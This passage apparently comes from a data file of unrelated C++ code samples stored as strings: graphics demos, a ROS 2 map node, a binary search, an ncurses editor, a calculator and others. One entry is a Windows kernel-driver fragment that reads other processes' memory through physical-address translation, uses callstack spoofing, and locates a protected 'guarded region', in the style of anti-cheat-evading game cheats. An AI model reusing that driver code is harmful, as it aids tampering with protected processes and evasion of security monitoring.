Custom Rendering using ImDrawList API / ShowExampleAppCustomRendering()\n// [SECTION] Example App: Documents Handling / ShowExampleAppDocuments()\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#include <ctype.h>          // toupper, isprint\n#include <limits.h>         // INT_MIN, INT_MAX\n#include <math.h>           // sqrtf, powf, cosf, sinf, floorf, ceilf\n#include <stdio.h>          // vsnprintf, sscanf, printf\n#include <stdlib.h>         // NULL, malloc, free, atoi\n#if defined(_MSC_VER) && _MSC_VER <= 1500 // MSVC 2008 or earlier\n#include <stddef.h>         // intptr_t\n#else\n#include <stdint.h>         // intptr_t\n#endif\n\n#ifdef _MSC_VER\n#pragma warning (disable: 4996) // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#define vsnprintf _vsnprintf\n#endif\n#ifdef __clang__\n#pragma clang diagnostic ignored \"-Wold-style-cast\"             // warning : use of old-style cast                              // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wdeprecated-declarations\"    // warning : 'xx' is deprecated: The POSIX name for this item.. // for strdup used in demo code (so user can copy & paste the code)\n#pragma clang diagnostic ignored \"-Wint-to-void-pointer-cast\"   // warning : cast to 'void *' from smaller integer type 'int'\n#pragma clang diagnostic ignored \"-Wformat-security\"            // warning : warning: format string is not a string literal\n#pragma clang diagnostic ignored \"-Wexit-time-destructors\"      // warning : declaration requires an exit-time destructor       // exit-time destruction order is undefined. if MemFree() leads to users code that has been disabled before exit it might cause problems. ImGui coding style welcomes static/globals.\n#if __has_warning(\"-Wreserved-id-macro\")\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"          // warning : macro name is a reserved identifier                //\n#endif\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wint-to-pointer-cast\"          // warning: cast to pointer from integer of different size\n#pragma GCC diagnostic ignored \"-Wformat-security\"        ",
    "#include \"Arduino.h\"\n#include \"../lib/luxigrid.h\"\n\nextern void setup();\nextern void loop();\n\n#ifdef GIF_PLAYER\n#include \"../apps/gif-player.hpp\"\n#endif\n\n#ifdef MORPHING_CLOCK\n#include \"../apps/morphing-clock.hpp\"\n#endif\n\n#ifdef PONG_CLOCK\n#include \"../apps/pong-clock.hpp\"\n#endif\n\n#ifdef STOCK_TICKER\n#include \"../apps/stock-ticker.hpp\"\n#endif\n\n#ifdef WEATHER_STATION\n#include \"../apps/weather-station.hpp\"\n#endif\n\n//\n// Animations\n//\n#ifdef ATTRACT\n#include \"../apps/animations/attract.hpp\"\n#endif\n\n#ifdef BUBBLES\n#include \"../apps/animations/bubbles.hpp\"\n#endif\n\n#ifdef CODE_RAIN\n#include \"../apps/animations/code-rain.hpp\"\n#endif\n\n#ifdef DVD_LOGO\n#include \"../apps/animations/dvd-logo.hpp\"\n#endif\n\n#ifdef ELECTRIC_MANDALA\n#include \"../apps/animations/electric-mandala.hpp\"\n#endif\n\n#ifdef FLOCK\n#include \"../apps/animations/flock.hpp\"\n#endif\n\n#ifdef FLOW_FIELD\n#include \"../apps/animations/flow-field.hpp\"\n#endif\n\n#ifdef HUE_VALUE_SPECTRUM\n#include \"../apps/animations/hue-value-spectrum.hpp\"\n#endif\n\n#ifdef INCREMENTAL_DRIFT\n#include \"../apps/animations/incremental-drift.hpp\"\n#endif\n\n#ifdef JULIA_SET\n#include \"../apps/animations/julia-set.hpp\"\n#endif\n\n#ifdef LIFE\n#include \"../apps/animations/life.hpp\"\n#endif\n\n#ifdef MAZE\n#include \"../apps/animations/maze.hpp\"\n#endif\n\n#ifdef MUNCH\n#include \"../apps/animations/munch.hpp\"\n#endif\n\n#ifdef PENDULUM_WAVE\n#include \"../apps/animations/pendulum-wave.hpp\"\n#endif\n\n#ifdef PERIODIC_TABLE\n#include \"../apps/animations/periodic-table.hpp\"\n#endif\n\n#ifdef PLASMA\n#include \"../apps/animations/plasma.hpp\"\n#endif\n\n#ifdef PONG_WARS\n#include \"../apps/animations/pong-wars.hpp\"\n#endif\n\n#ifdef SIMPLEX_NOISE\n#include \"../apps/animations/simplex-noise.hpp\"\n#endif\n\n#ifdef SNAKE_GAME\n#include \"../apps/animations/snake-game.hpp\"\n#endif\n\n#ifdef SNAKES\n#include \"../apps/animations/snakes.hpp\"\n#endif\n\n#ifdef SWIRL\n#include \"../apps/animations/swirl.hpp\"\n#endif\n\n#ifdef TV_TEST_PATTERN\n#include \"../apps/animations/tv-test-pattern.hpp\"\n#endif",
    "#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nint binarySearch(const vector<int>& arr, int target) {\n    int low = 0, high = arr.size() - 1;\n    \n    while (low <= high) {\n        int mid = low + (high - low) / 2; // Avoids overflow\n        if (arr[mid] == target) {\n            return mid; // Target found, return index\n        } else if (arr[mid] > target) {\n            high = mid - 1; // Target is on the left side\n        } else {\n            low = mid + 1; // Target is on the right side\n        }\n    }\n\n    return -1; // Target not found\n}\n\nint main() {\n    vector<int> arr = {1, 4, 6, 8, 9, 11, 14, 15, 20, 25, 33, 83, 87, 97, 99, 100};\n    int target = 1;\n    int target_idx = binarySearch(arr, target);\n\n    if (target_idx == -1) {\n        cout << \"Target is missing\" << endl;\n    } else {\n        cout << \"Target is at index \" << target_idx << endl;\n    }\n\n    return 0;\n}\n\n/*\n    Binary Search is only applicable when the array is sorted\n    Time Complexity is O(log2(n))\n*/\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sixteenoct\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <chrono>\n#include <functional>\n#include <memory>\n#include <string>\n\n#include \"rclcpp/rclcpp.hpp\"\n#include \"nav_msgs/msg/occupancy_grid.hpp\"\n#include \"multi_truck_scenario/msg/vehicle_base_data.hpp\"\n#include \"multi_truck_scenario/msg/s2_solution.hpp\"\n#include \"geometry_msgs/msg/point.hpp\"\n\nusing namespace std::chrono_literals;\nnamespace mts_msgs = multi_truck_scenario::msg;\n\n\nenum Colors {\n    Red = -128,      // rot f\u00fcr -128 bis -70\n    Yellow = -70,    // gelb f\u00fcr -70 bis -2\n    Grey = 0,       // grau f\u00fcr -1 bis 80\n    Black = 100,      // schwarz f\u00fcr 80 bis 100\n    Green = 127      // gr\u00fcn (101 bis 127) f\u00fcr Gewinnerfahrzeug in s2_solution_callback\n};\nclass Map : public rclcpp::Node\n{\n  public:\n    Map() : rclcpp::Node(\"map\")\n    {\n      m_width = 4;\n      m_height = 4;\n      m_resolution = 1;\n      m_color_map.emplace(1, Colors::Red);\n      m_color_map.emplace(2, Colors::Red);\n      m_color_map.emplace(3, Colors::Red);\n\n\n      m_grid_pub = this->create_publisher<nav_msgs::msg::OccupancyGrid>(\"map_data\", 10);\n      m_timer = this->create_wall_timer(\n        send_frequenzy, std::bind(&Map::timer_callback, this)\n      );\n\n      m_vehicle_sub = this->create_subscription<mts_msgs::VehicleBaseData>(\"vehicle_base_data\", 10,\n        std::bind(&Map::vehicle_position_callback, this, std::placeholders::_1)\n      );\n\n      m_s2_solution_sub = this->create_subscription<mts_msgs::S2Solution>(\"s2_solution\", 10,\n        std::bind(&Map::s2_solution_callback, this, std::placeholders::_1)\n      );\n    }\n\n  private:\n    void timer_callback()\n    {\n      auto grid = nav_msgs::msg::OccupancyGrid();\n      grid.info.height = m_height;\n      grid.info.width = m_width;\n      grid.info.resolution = m_resolution;\n\n      grid.header.stamp = rclcpp::Clock().now();\n      grid.header.frame_id = \"map_frame\";\n\n      grid.info.origin.position.x = 0;\n      grid.info.origin.position.y = 0;\n      grid.info.origin.position.z = 0;\n      grid.info.origin.orientation.x = 0;\n      grid.info.origin.orientation.y = 0;\n      grid.info.origin.orientation.z = 0;\n      grid.info.origin.orientation.w = 1;\n    \n      grid.data = {\n          Colors::Black, Colors::Grey, Colors::Grey, Colors::Black,\n          Colors::Grey, Colors::Grey, Colors::Grey, Colors::Grey,\n          Colors::Grey, Colors::Grey, Colors::Grey, Colors::Grey,\n          Colors::Black, Colors::Grey, Colors::Grey, Colors::Black,\n      };\n\n    // update vehicle position on the grid \n    for (const auto& vehicle : m_vehicles)\n    {\n      const int x = vehicle.second->position.point.x;\n      const int y = vehicle.second->position.point.y;\n      grid.data[x + y * m_width] = m_color_map[vehicle.first];\n    }\n\n      m_grid_pub->publish(grid);\n    }\n\n    void vehicle_position_callback(const mts_msgs::VehicleBaseData::SharedPtr vehicle_data)\n    {\n      const auto key = vehicle_data->vin;\n      if (m_vehicles.count(key) == 0) \n      {\n        m_vehicles.emplace(key, vehicle_data);\n      }\n      else \n      {\n        m_vehicles[key] = vehicle_data;\n      }\n    }\n\n    void s2_solution_callback(const mts_msgs::S2Solution::SharedPtr solution)\n    {\n        RCLCPP_INFO(this->get_logger(), \"winner vin: %d\", solution->winner_vin);\n        m_color_map[solution->winner_vin] = Colors::Green;\n    }\n\n    int m_width;\n    int m_height;\n    int m_resolution;\n    std::chrono::milliseconds send_frequenzy = 500ms;\n    rclcpp::TimerBase::SharedPtr m_timer;\n    std::unordered_map<int, mts_msgs::VehicleBaseData::SharedPtr> m_vehicles;\n    std::unordered_map<int, int> m_color_map;\n    rclcpp::Publisher<nav_msgs::msg::OccupancyGrid>::SharedPtr m_grid_pub;\n    rclcpp::Subscription<mts_msgs::VehicleBaseData>::SharedPtr m_vehicle_sub;\n    rclcpp::Subscription<mts_msgs::S2Solution>::SharedPtr m_s2_solution_sub;\n};\n\nint main(int argc, char * argv[])\n{\n  rclcpp::init(argc, argv);\n  rclcpp::spin(std::make_shared<Map>());\n  rclcpp::shutdown();\n  return 0;\n}",
    "#include <iostream>\n#include <pro.h>\n#include <kernwin.hpp>\n#include <funcs.hpp>\n#include \"idahost.h\"\n#include <Windows.h>\n\nint WINAPI WinMain(\n    HINSTANCE hInstance, \n    HINSTANCE hPrevInstance, \n    LPSTR lpCmdLine, \n    int nShowCmd) \n{\n    idahost_t::options_t opt = {\n        //.idadir = L\"C:\\\\Users\\\\elias\\\\Projects\\\\ida\\\\idasdk_pro84\\\\idahost\",\n        .input_file = L\"C:\\\\Temp\\\\test.i64\",\n        //.log_file = L\"myida.log\",\n        //.dbg = IDA_DEBUG_PLUGIN\n    };\n    if (!idahost.init(opt))\n    {\n        std::cout << \"Failed to initialize the host:\" << idahost.err_str() << std::endl;\n        return 1;\n    }\n\n    //\n    // IDASDK API calls here.\n    //\n    msg(\"Hello, World!\\n\");\n\n    qstring s;\n    for (size_t i = 0, c = get_func_qty(); i < c; ++i)\n    {\n        func_t* f = getn_func(i);\n        if (get_func_name(&s, f->start_ea) == 0)\n            s = \"\";\n        std::cout << std::hex << f->start_ea << \": function: \" << s << std::endl;\n    }\n\n    //idahost.interact();\n    idahost.term();\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <ncurses.h>\n#include <vector>\n\nvoid save_file(const std::string &filename, const std::vector<std::string> &lines) {\n    std::ofstream file(filename);\n    if (file.is_open()) {\n        for (const auto &line : lines) {\n            file << line << std::endl;\n        }\n        file.close();\n    } else {\n        std::cerr << \"[ERROR]Could not save file \" << filename << std::endl;\n    }\n}\n\nvoid show_help(){\n    printw(\"Commands:\\n\");\n    printw(\":w   - Save File\\n\");\n    printw(\":q   - Leave editor\\n\");\n    printw(\":q!  - Leave without save\\n\");\n    printw(\":h   - Show help menu (this menu)\\n\");\n    printw(\"Press any key to continue...\\n\");\n    refresh();\n    getch(); // Aguarda uma tecla para voltar\n}\n\n//argc vai contar o n\u00famero de argumentos passados na linha de comando\n//argv \u00e9 o vetor que c ontem os argumentos passados\n//o primeiro argumento (argv[0]) \u00e9 sempre o nome do programa\nint main(int argc, char* argv[]){\n    //ele verifica se o usuario passou o nome do arquivo como argumento\n    //se o usuario nao passou o nome do arquivo, imprime uma mensagem de uso e encerra\n    if(argc < 2){\n        std::cout << \"Usage: \" << argv[0] << \" <filename>\" << std::endl;\n        return 1; //caso retorna 1, ele indica que o programa foi encerrado com erro\n    }\n\n    //inicializando a biblioteca ncurses\n    initscr(); //inicia o modo ncurses\n    cbreak(); //desativa o buffer de linha, recebemos as entradas imediatamente\n    keypad(stdscr, TRUE); //habilita o uso de teclas especiais como setas\n    noecho(); //impede que o input do usuario seja mostrado na tela automaticamente\n    curs_set(1); //mostra o cursor\n\n    //cria um objeto ifstream (input file stream) para abrir o arquivo no modo leitura\n    std::ifstream file(argv[1]); //argv[1] \u00e9 o nome do arquivo passado pelo usuario\n    if (!file.is_open()){ //verifica se o arquivo foi aberto com sucesso\n        //se o arquivo nao puder ser aberto, imprime uma mensagem de erro\n        endwin(); //encera ncurses antes de sair\n        std::cout << \"[ERROR]Could not open file \" << argv[1] << std::endl;\n        return 1; //retorna 1 que indica erro\n    }\n    //cria uma variavel para armazenar cada linha do arquivo e a posi\u00e7\u00e3o do cursos\n    std::vector<std::string> lines;\n    std::string line;\n\n    //exibe o conteudo do arquivo na tela\n    while(std::getline(file, line)){\n        lines.push_back(line); //imprime linha\n    }\n    file.close();\n\n    //movimenta\u00e7\u00e3o do cursos\n    int row = 0, col = 0;\n    int top_line = 0; //linha superior visivel\n    int max_lines = LINES - 1; //quantidade de linhas visiveis no terminal, -1 para a linha de comandos\n\n    //funcao para \"desenhar\" o conteudo visivel na tela\n    auto draw_screen = [&](int top_line){\n        clear(); //limpa a tela\n        for (int i = 0; i < max_lines - 1; ++i){ //deixa uma linha para comandos no final\n            if (top_line + i < lines.size()){\n                mvprintw(i, 0, \"%s\", lines[top_line + i].c_str());\n            }\n        }\n        move(row, col); //move o cursor para posi\u00e7\u00e3o atual\n        refresh(); //atualiza a tela\n    };\n\n    //desenha a tela pela primeira vez\n    draw_screen(top_line);\n\n    int ch;\n    std::string command; //variavel de comando\n    bool command_mode = false; //flag para o modo de comando\n\n    while ((ch = getch()) != 'q') {\n        if (command_mode) {\n            if (ch == '\\n') { //executa o comando ao pressionar Enter\n                if (command == \"w\") { //comando para salvar\n                    save_file(argv[1], lines);\n                }\n                command.clear(); //limpa o comando\n                command_mode = false; //sai do modo de comando\n            } else if (ch == 27) { //ESC para sair do modo de comando\n                command.clear(); //limpa o comando\n                command_mode = false; //sai do modo de comando\n            } else {\n                command += ch; //adiciona caractere ao comando\n            }\n        } else {\n            switch (ch) {\n                case KEY_UP:\n                    if (row > 0) {\n                        row--;\n                    } else if (top_line > 0) {\n                        top_line--;\n                    }\n                    break;\n                case KEY_DOWN:\n                    if (row < max_lines - 1 && top_line + row + 1 < lines.size()) {\n                        row++;\n                    } else if (top_line + max_lines < lines.size()) {\n                        top_line++;\n                    }\n                    break;\n                case KEY_LEFT:\n                    if (col > 0) col--;\n                    break;\n                case KEY_RIGHT:\n                    if (col < COLS - 1) col++;\n                    break;\n                case ':': //entrar no modo de comando\n                    command_mode = true;\n                    command.clear(); //limpa o comando\n                    break;\n                case 'e': { //entrar no modo de edi\u00e7\u00e3o (opciona",
    "#include <iostream>\n#include <string>\n#include <cmath>\nusing namespace std;\n\nvoid usage() {\n    // Prints usage message (help)\n    system(\"figlet XSC | lolcat\");\n    cout << \"\\neXtremelySimpleCalculator usage:\\n\"\n    << \"`xsc --help | -h` for help\\n\"\n    << \"`xsc <number> <(+|-|x|/|%|^)> <number>` for mathematical operation\\n\"\n    << \"`xsc -sqrt | -r <number>` for square root operation\\n\"\n    << \"\\n[n!] `xsc` doesn't support mathematical expressions (to-do)\\n\";\n}\n\nint main(int argc, char* argv[]) {\n    // AAAAAAAAAA (a.k.a. argument validation and execution)\n    for (int i = 1; i < argc; ++i) {\n        string arg = argv[i];\n\n        if (arg == \"--sqrt\" || arg == \"-r\") {\n            if (i + 1 < argc) {\n                double num = stod(argv[i + 1]);\n                cout << sqrt(num) << \"\\n\";\n                return 0;\n            }\n            else {\n                cout << \"[e!] invalid input!\\n\";\n                usage();\n                return 1;\n            }\n        }\n        else if (arg == \"--help\" || arg == \"-h\") {\n            usage();\n            return 0;\n        }\n        else if (i + 2 < argc) {\n            string op = argv[i + 1];\n            double num1 = stod(argv[i]);\n            double num2 = stod(argv[i + 2]);\n            double result;\n\n            if (op == \"+\") {\n                result = num1 + num2;\n            }\n            else if (op == \"-\") {\n                result = num1 - num2;\n            }\n            else if (op == \"x\") {\n                result = num1 * num2;\n            }\n            else if (op == \"/\") {\n                if (num2 != 0) {\n                    result = num1 / num2;\n                }\n                else {\n                    cout << \"[math_e!] division by zero!\\n\";\n                    usage();\n                    return 1;\n                }\n            }\n            else if (op == \"%\") {\n                result = fmod(num1, num2);\n            }\n            else if (op == \"^\") {\n                result = pow(num1, num2);\n            }\n            else {\n                cout << \"[e!] invalid operator!\\n\";\n                usage();\n                return 1;\n            }\n            // show result :)\n            cout << result << \"\\n\";\n            return 0;\n        }\n        else {\n            cout << \"[e!] invalid input!\\n\";\n            usage();\n            return 1;\n        }\n\n    }\n\n    return 0;\n}\n",
    "#include <core/features/memory/m_function.h>\r\n#include <dependencies/spoofing/callstack.h>\r\n#include <core/features/dtb/dtb.h>\r\n\r\nNTSTATUS resolve_dtb(dtb_invoke* request)\r\n{\r\n    dtb_invoke data = { 0 };\r\n\r\n    PEPROCESS process = 0;\r\n    if (PsLookupProcessByProcessId((HANDLE)data.process_id, &process) != STATUS_SUCCESS)\r\n    {\r\n        DbgPrint(\"invalid process.\\n\");\r\n        return STATUS_UNSUCCESSFUL;\r\n    }\r\n\r\n    physical::m_stored_dtb = pml4::dirbase_from_base_address((void*)PsGetProcessSectionBaseAddress(process));\r\n\r\n    DbgPrint(\"cr3: %llx\\n\", physical::m_stored_dtb);\r\n\r\n    ObfDereferenceObject(process);\r\n\r\n    return STATUS_SUCCESS;\r\n}\r\n\r\nNTSTATUS memory::read_memory(pread_invoke x)\r\n{\r\n    hide;\r\n\r\n    PEPROCESS process = nullptr;\r\n    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)x->process_id, &process);\r\n\r\n    if (!NT_SUCCESS(status) || !process)\r\n        return STATUS_UNSUCCESSFUL;\r\n\r\n    __try\r\n    {\r\n        SIZE_T this_offset = 0;\r\n        SIZE_T total_size = x->size;\r\n\r\n        if (total_size == 0)\r\n        {\r\n            ObDereferenceObject(process);\r\n            return STATUS_INVALID_PARAMETER;\r\n        }\r\n\r\n        auto physical_address = physical::translate_linear(physical::m_stored_dtb, x->address + this_offset);\r\n\r\n        if (!physical_address)\r\n        {\r\n            return STATUS_UNSUCCESSFUL;\r\n        }\r\n\r\n        ULONG64 final_size = physical::find_min(PAGE_SIZE - (physical_address & 0xFFF), x->size);\r\n        SIZE_T bytes_read = 0;\r\n\r\n        NTSTATUS read_status = physical::read_physical(physical_address, (PVOID)(x->buffer + this_offset), final_size, &bytes_read);\r\n        if (!NT_SUCCESS(read_status))\r\n        {\r\n            ObDereferenceObject(process);\r\n            return read_status;\r\n        }\r\n    }\r\n    __except (EXCEPTION_EXECUTE_HANDLER)\r\n    {\r\n        ObDereferenceObject(process);\r\n        return GetExceptionCode();\r\n    }\r\n\r\n    ObDereferenceObject(process);\r\n    return STATUS_SUCCESS;\r\n}\r\n\r\nUINT_PTR memory::find_guarded_region(pggr_invoke x)\r\n{\r\n    hide;\r\n\r\n    PSYSTEM_BIGPOOL_INFORMATION pool_information = 0;\r\n\r\n    ULONG information_length = 0;\r\n    NTSTATUS status = ZwQuerySystemInformation(System_bigpool_informationn, &information_length, 0, &information_length);\r\n\r\n    while (status == STATUS_INFO_LENGTH_MISMATCH)\r\n    {\r\n        if (pool_information)\r\n            ExFreePool(pool_information);\r\n\r\n        pool_information = (PSYSTEM_BIGPOOL_INFORMATION)ExAllocatePool(NonPagedPool, information_length);\r\n        status = ZwQuerySystemInformation(System_bigpool_informationn, pool_information, information_length, &information_length);\r\n    }\r\n    x->address = 0;\r\n\r\n    if (pool_information)\r\n    {\r\n        for (ULONG i = 0; i < pool_information->Count; i++)\r\n        {\r\n            SYSTEM_BIGPOOL_ENTRY* allocation_entry = &pool_information->AllocatedInfo[i];\r\n\r\n            UINT_PTR virtual_address = (UINT_PTR)allocation_entry->VirtualAddress & ~1ull;\r\n\r\n            if (allocation_entry->NonPaged && allocation_entry->SizeInBytes == 0x200000)\r\n            {\r\n                if (x->address == 0 && allocation_entry->TagUlong == 'TnoC') {\r\n                    x->address = virtual_address;\r\n                }\r\n\r\n            }\r\n        }\r\n\r\n        ExFreePool(pool_information);\r\n    }\r\n\r\n    return x->address;\r\n}\r\n\r\n\r\nauto memory::get_dtb_offset() {\r\n\r\n    RTL_OSVERSIONINFOW ver = { 0 };\r\n    RtlGetVersion(&ver);\r\n\r\n    switch (ver.dwBuildNumber)\r\n    {\r\n    case WINDOWS_1803:\r\n        return 0x0278;\r\n        break;\r\n    case WINDOWS_1809:\r\n        return 0x0278;\r\n        break;\r\n    case WINDOWS_1903:\r\n        return 0x0280;\r\n        break;\r\n    case WINDOWS_1909:\r\n        return 0x0280;\r\n        break;\r\n    case WINDOWS_2004:\r\n        return 0x0388;\r\n        break;\r\n    case WINDOWS_20H2:\r\n        return 0x0388;\r\n        break;\r\n    case WINDOWS_21H1:\r\n        return 0x0388;\r\n        break;\r\n    default:\r\n        return 0x0388;\r\n    }\r\n}\r\n\r\nuintptr_t memory::get_proc_dirbase(PEPROCESS process, uintptr_t base)\r\n{\r\n\r\n    if (!process) return 0;\r\n\r\n    uintptr_t process_dirbase = (uintptr_t)((PUCHAR)process + 0x28);\r\n    if (process_dirbase == 0)\r\n    {\r\n        ULONG user_diroffset = get_dtb_offset();\r\n        process_dirbase = (uintptr_t)((PUCHAR)process + user_diroffset);\r\n    }\r\n    if ((process_dirbase >> 0x38) == 0x40)\r\n    {\r\n        process_dirbase = pml4::dirbase_from_base_address((void*)base);\r\n    }\r\n\r\n    return process_dirbase;\r\n}",
    "\ufeff/*============================================\n    \u0413\u0440\u0443\u043f\u043f\u043e\u0432\u043e\u0439 \u0432\u0430\u0440\u0438\u0430\u043d\u0442 #4\n\n\n\n============================================*/\n\n\n\n\n\n\n/* DEV-APP V2 ===== DEV-APP V2 ===== DEV-APP V2 ===== DEV-APP V2 ===== DEV-APP V2 ===== DEV-APP V2 */\n\n\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <SFML/Graphics.hpp>\n\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0447\u0438\u0441\u043b\u0430 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430 \u0432 \u0444\u043e\u0440\u043c\u0430\u0442\u0435 little-endian\ntemplate<typename T>\nT readNumber(std::ifstream& file) {\n    T value;\n    char* ptr = reinterpret_cast<char*>(&value);\n    for (size_t i = 0; i < sizeof(T); ++i) {\n        file.read(ptr + i, 1);\n    }\n    return value;\n}\n\nint main() {\n    // \u041e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0444\u0430\u0439\u043b \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0432 \u0431\u0438\u043d\u0430\u0440\u043d\u043e\u043c \u0440\u0435\u0436\u0438\u043c\u0435\n    std::ifstream file(\"test.ya3\", std::ios::binary);\n    if (!file) {\n        std::cerr << \"\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043e\u0442\u043a\u0440\u044b\u0442\u044c \u0444\u0430\u0439\u043b \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f.\" << std::endl;\n        return 1;\n    }\n\n    // \u0427\u0438\u0442\u0430\u0435\u043c \u0448\u0438\u0440\u0438\u043d\u0443 \u0438 \u0432\u044b\u0441\u043e\u0442\u0443 (2 \u0431\u0430\u0439\u0442\u0430 \u043a\u0430\u0436\u0434\u043e\u0435)\n    uint16_t width = readNumber<uint16_t>(file);\n    uint16_t height = readNumber<uint16_t>(file);\n\n    // \u0427\u0438\u0442\u0430\u0435\u043c \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0431\u0438\u0442 \u043d\u0430 \u043f\u0438\u043a\u0441\u0435\u043b\u044c (1 \u0431\u0430\u0439\u0442)\n    uint8_t bitsPerPixel = readNumber<uint8_t>(file);\n\n    // \u0427\u0438\u0442\u0430\u0435\u043c \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u043f\u0430\u043b\u0438\u0442\u0440\u044b (2 \u0431\u0430\u0439\u0442\u0430)\n    uint16_t paletteEntries = readNumber<uint16_t>(file);\n\n    // \u0427\u0438\u0442\u0430\u0435\u043c \u0437\u0430\u043f\u0438\u0441\u0438 \u043f\u0430\u043b\u0438\u0442\u0440\u044b\n    std::vector<uint16_t> angles(paletteEntries);\n    std::vector<uint16_t> lengths(paletteEntries);\n    std::vector<uint8_t> rValues(paletteEntries);\n    std::vector<uint8_t> gValues(paletteEntries);\n    std::vector<uint8_t> bValues(paletteEntries);\n    std::vector<uint8_t> aValues(paletteEntries);\n\n    for (size_t i = 0; i < paletteEntries; ++i) {\n        angles[i] = readNumber<uint16_t>(file);\n        lengths[i] = readNumber<uint16_t>(file);\n        rValues[i] = readNumber<uint8_t>(file);\n        gValues[i] = readNumber<uint8_t>(file);\n        bValues[i] = readNumber<uint8_t>(file);\n        aValues[i] = readNumber<uint8_t>(file);\n    }\n\n    // \u0417\u0430\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0444\u0430\u0439\u043b\n    file.close();\n\n    // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043e\u043a\u043d\u043e SFML\n    sf::RenderWindow window(sf::VideoMode(width, height), \"SFML Circle\");\n\n    // \u0420\u0430\u0434\u0438\u0443\u0441 \u043a\u0440\u0443\u0433\u0430 - \u043d\u0430\u0438\u043c\u0435\u043d\u044c\u0448\u0430\u044f \u0432\u0435\u043b\u0438\u0447\u0438\u043d\u0430 \u0438\u0437 \u0432\u044b\u0441\u043e\u0442\u044b \u0438 \u0448\u0438\u0440\u0438\u043d\u044b\n    float radius = std::min(width, height) / 2.0f - 50.0f;\n\n    // \u0426\u0435\u043d\u0442\u0440 \u043e\u043a\u043d\u0430\n    sf::Vector2f center(width / 2.0f, height / 2.0f);\n\n    // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0441\u0435\u043a\u0442\u043e\u0440\u0430\n    std::vector<sf::VertexArray> sectors(paletteEntries, sf::VertexArray(sf::TrianglesFan));\n\n    float totalAngle = 0.0f;\n    for (size_t i = 0; i < paletteEntries; ++i) {\n        float angle = angles[i] * 3.14159265f / 180.0f;\n        float length = lengths[i];\n        sf::Color color(rValues[i], gValues[i], bValues[i], aValues[i]);\n\n        // \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0446\u0435\u043d\u0442\u0440\u0430\u043b\u044c\u043d\u0443\u044e \u0442\u043e\u0447\u043a\u0443 \u0441\u0435\u043a\u0442\u043e\u0440\u0430\n        sectors[i].append(sf::Vertex(center, color));\n\n        // \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0432\u0435\u0440\u0448\u0438\u043d\u044b \u0434\u043b\u044f \u0434\u0443\u0433\u0438 \u0441\u0435\u043a\u0442\u043e\u0440\u0430\n        for (float a = 0.0f; a <= angle; a += 0.01f) {\n            sectors[i].append(sf::Vertex(center + radius * sf::Vector2f(std::cos(totalAngle + a), std::sin(totalAngle + a)), color));\n        }\n\n        totalAngle += angle;\n    }\n\n    // \u041e\u0441\u043d\u043e\u0432\u043d\u043e\u0439 \u0446\u0438\u043a\u043b \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f\n    while (window.isOpen()) {\n        sf::Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == sf::Event::Closed)\n                window.close();\n        }\n\n        window.clear(sf::Color::White);\n\n        // \u0420\u0438\u0441\u0443\u0435\u043c \u0441\u0435\u043a\u0442\u043e\u0440\u0430\n        for (const auto& sector : sectors) {\n            window.draw(sector);\n        }\n\n        window.display();\n    }\n\n    return 0;\n}\n\n\n\n\n\n\n/* MAIN-APP V4 ======== MAIN-APP V4 ======== MAIN-APP V4 ======== MAIN-APP V4 ======== MAIN-APP V4 ======== MAIN-APP V4 ======== MAIN-APP V4*/\n\n\n\n//#include <iostream>\n//#include <fstream>\n//#include <vector>\n//#include <SFML/Graphics.hpp>\n//#include <cmath>\n//\n//// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f 